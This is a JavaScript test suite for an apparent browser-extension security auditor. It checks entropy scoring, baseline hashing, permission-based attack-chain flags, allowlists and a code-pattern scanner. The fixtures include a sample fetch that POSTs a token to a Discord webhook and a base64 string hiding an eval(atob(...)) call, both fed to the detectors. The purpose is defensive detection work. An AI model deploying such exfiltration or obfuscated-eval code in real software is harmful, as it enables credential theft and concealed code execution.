import { test } from 'node:test';
import assert from 'node:assert/strict';
import { calculateShannonEntropy, computeSha256 } from '../src/core/cryptoUtils.js';
import { evaluateExtensionRisk, SEVERITY_LEVELS } from '../src/core/riskEngine.js';
import { 
  saveBaseline, 
  getBaseline, 
  clearAllAuditData, 
  getAllowlist, 
  setExtensionAllowlist, 
  removeExtensionAllowlist, 
  isExtensionAllowlisted,
  switchActiveBaseline,
  getSnapshotHistory,
  exportAuditDossier,
  importAuditDossier,
  exportReportAsMarkdown,
  exportReportAsCSV
} from '../src/core/storage.js';
import { scanCodeForPatterns, PATTERN_CATEGORIES } from '../src/core/packageAnalyzer.js';
import { normalizeExtension } from '../src/core/inventory.js';

test('Advanced Feature: Shannon Entropy distinguishes clean code from encrypted/packed data', () => {
  const plainText = 'function helloWorld() { console.log("Hello, world!"); return 42; }';
  const plainEntropy = calculateShannonEntropy(plainText);
  assert.ok(plainEntropy < 4.8, `Plain text entropy should be low: ${plainEntropy}`);

  // Base64 high-density pseudo-random string
  const packedData = 'aW5pdGlhbGl6ZUJsb2IoNDIpO2V2YWwoYXRvYignWkdWd2JHOWpiMlJsTFhkbFlubG1hV2RsYm1ScGJDNHVJRzVsZDJsc2RYSmxhVzVsYkd4bFlubGZhV052Ymc9PScpKTs=';
  const packedEntropy = calculateShannonEntropy(packedData);
  assert.ok(packedEntropy > 5.2, `Packed data entropy should be elevated: ${packedEntropy}`);

  // Zero-length data returns 0
  assert.equal(calculateShannonEntropy(''), 0);
});

test('Advanced Feature: SHA-256 integrity hash is computed and stored with baseline snapshots', async () => {
  await clearAllAuditData();

  const inventory = [
    normalizeExtension({
      id: 'ffffffffffffffffffffffffffffffff',
      name: 'Tamper Resistant Tool',
      version: '1.0.0',
      permissions: ['storage']
    })
  ];

  const snapshot = await saveBaseline(inventory, 'Baseline with SHA256');
  assert.ok(snapshot.sha256, 'Snapshot must include sha256 hash');
  assert.equal(typeof snapshot.sha256, 'string');
  assert.equal(snapshot.sha256.length, 64, 'SHA-256 hex must be 64 characters');

  // Verify determinism
  const hashAgain = await computeSha256(JSON.stringify(snapshot.extensions, Object.keys(snapshot.extensions).sort()));
  assert.equal(snapshot.sha256, hashAgain);
});

test('Advanced Feature: Composite attack chains are identified by the risk engine', () => {
  // Chain 1: Cookies + Broad Hosts (Credential harvesting)
  const cookieAndHostExt = normalizeExtension({
    id: 'cccccccccccccccccccccccccccccccc',
    name: 'Session Sniffer',
    version: '1.0.0',
    permissions: ['cookies'],
    hostPermissions: ['*://*/*']
  });
  const risk1 = evaluateExtensionRisk(cookieAndHostExt);
  const credFlag = risk1.flags.find(f => f.type === 'COMPOSITE_CREDENTIAL_HIJACKING');
  assert.ok(credFlag, 'Must detect cookies + broad hosts composite threat');
  assert.equal(credFlag.severity, SEVERITY_LEVELS.HIGH);

  // Chain 2: Debugger + Tabs (Full browser instrumentation)
  const debuggerExt = normalizeExtension({
    id: 'dddddddddddddddddddddddddddddddd',
    name: 'Runtime Instrumenter',
    version: '1.0.0',
    permissions: ['debugger', 'tabs'],
    hostPermissions: []
  });
  const risk2 = evaluateExtensionRisk(debuggerExt);
  const debugFlag = risk2.flags.find(f => f.type === 'COMPOSITE_DEBUGGER_INSTRUMENTATION');
  assert.ok(debugFlag, 'Must detect debugger + tabs composite threat');
  assert.equal(debugFlag.severity, SEVERITY_LEVELS.CRITICAL);

  // Chain 3: Offscreen + Broad Hosts (MV3 hidden DOM scraping)
  const offscreenExt = normalizeExtension({
    id: 'eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee',
    name: 'Background Scraper',
    version: '1.0.0',
    permissions: ['offscreen'],
    hostPermissions: ['<all_urls>']
  });
  const risk3 = evaluateExtensionRisk(offscreenExt);
  const offscreenFlag = risk3.flags.find(f => f.type === 'COMPOSITE_OFFSCREEN_SCRAPING');
  assert.ok(offscreenFlag, 'Must detect offscreen + broad hosts composite threat');
});

test('Advanced Feature: Analyst allowlist tags trusted extensions and contextualizes risk', async () => {
  await clearAllAuditData();

  const extId = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
  await setExtensionAllowlist(extId, {
    trusted: true,
    note: 'Internal corporate security extension vetted by SOC'
  });

  const allowlist = await getAllowlist();
  assert.ok(isExtensionAllowlisted(extId, allowlist));
  assert.equal(allowlist[extId].note, 'Internal corporate security extension vetted by SOC');

  const ext = normalizeExtension({
    id: extId,
    name: 'Corporate Shield',
    version: '2.0.0',
    permissions: ['cookies'],
    hostPermissions: ['*://*/*']
  });

  const risk = evaluateExtensionRisk(ext, allowlist);
  assert.equal(risk.isAllowlisted, true);
  assert.ok(risk.flags.some(f => f.type === 'ANALYST_ALLOWLISTED'));

  // Test removal
  await removeExtensionAllowlist(extId);
  const allowlistAfter = await getAllowlist();
  assert.equal(isExtensionAllowlisted(extId, allowlistAfter), false);
});

test('Advanced Feature: Multi-baseline switching and snapshot history', async () => {
  await clearAllAuditData();

  const inventory1 = [normalizeExtension({ id: '11111111111111111111111111111111', name: 'Ext 1' })];
  const baseline1 = await saveBaseline(inventory1, 'Checkpoint 1');

  const inventory2 = [
    normalizeExtension({ id: '11111111111111111111111111111111', name: 'Ext 1' }),
    normalizeExtension({ id: '22222222222222222222222222222222', name: 'Ext 2' })
  ];
  const baseline2 = await saveBaseline(inventory2, 'Checkpoint 2');

  const history = await getSnapshotHistory();
  assert.equal(history.length, 2);

  // Switch back to checkpoint 1
  const switched = await switchActiveBaseline(baseline1.id);
  assert.equal(switched.id, baseline1.id);
  assert.equal(switched.label, 'Checkpoint 1');

  const currentActive = await getBaseline();
  assert.equal(currentActive.id, baseline1.id);
});

test('Advanced Feature: Export and import of complete audit dossier', async () => {
  await clearAllAuditData();

  const inventory = [normalizeExtension({ id: '33333333333333333333333333333333', name: 'Tool A', version: '1.0' })];
  const baseline = await saveBaseline(inventory, 'Exportable Baseline');

  const dossier = await exportAuditDossier({ inventory });
  assert.equal(dossier.exportVersion, '1.0');
  assert.equal(dossier.activeBaseline.id, baseline.id);
  assert.equal(dossier.currentInventory.length, 1);

  // Test Markdown export
  const md = exportReportAsMarkdown({
    inventory,
    baseline,
    changes: [],
    reviews: {},
    allowlist: {}
  });
  assert.ok(md.includes('# ExtensionLedger — Security Audit Dossier'));
  assert.ok(md.includes('Tool A'));
  assert.ok(md.includes(baseline.sha256));

  // Test CSV export
  const csv = exportReportAsCSV({ inventory, changes: [], reviews: {} });
  assert.ok(csv.includes('"INVENTORY","Tool A"'));

  // Clear and restore
  await clearAllAuditData();
  assert.equal(await getBaseline(), null);

  const importRes = await importAuditDossier(dossier);
  assert.equal(importRes.success, true);
  const restored = await getBaseline();
  assert.equal(restored.id, baseline.id);
});

test('Advanced Feature: Package Analyzer detects webhooks and supports custom analyst rules', () => {
  const sourceWithWebhook = `
    const exfilUrl = "https://discord.com/api/webhooks/1234567890/tokenABCDEF";
    fetch(exfilUrl, { method: "POST", body: JSON.stringify({ token: "leaked" }) });
  `;

  const leads = scanCodeForPatterns(sourceWithWebhook, 'background.js');
  const webhookLead = leads.find(l => l.category === PATTERN_CATEGORIES.DATA_EXFILTRATION);
  assert.ok(webhookLead, 'Must detect discord webhook');
  assert.equal(webhookLead.severity, 'CRITICAL');

  // Custom analyst rule test
  const customRules = [
    {
      category: 'Internal Domain Exfiltration',
      severity: 'HIGH',
      regex: /corp-internal\.example\.com\/telemetry/g,
      description: 'Matches internal test telemetry domain'
    }
  ];

  const customSource = 'const target = "https://corp-internal.example.com/telemetry/beacon";';
  const customLeads = scanCodeForPatterns(customSource, 'content.js', customRules);
  const customLead = customLeads.find(l => l.category === 'Internal Domain Exfiltration');
  assert.ok(customLead, 'Must trigger custom analyst rule');
});
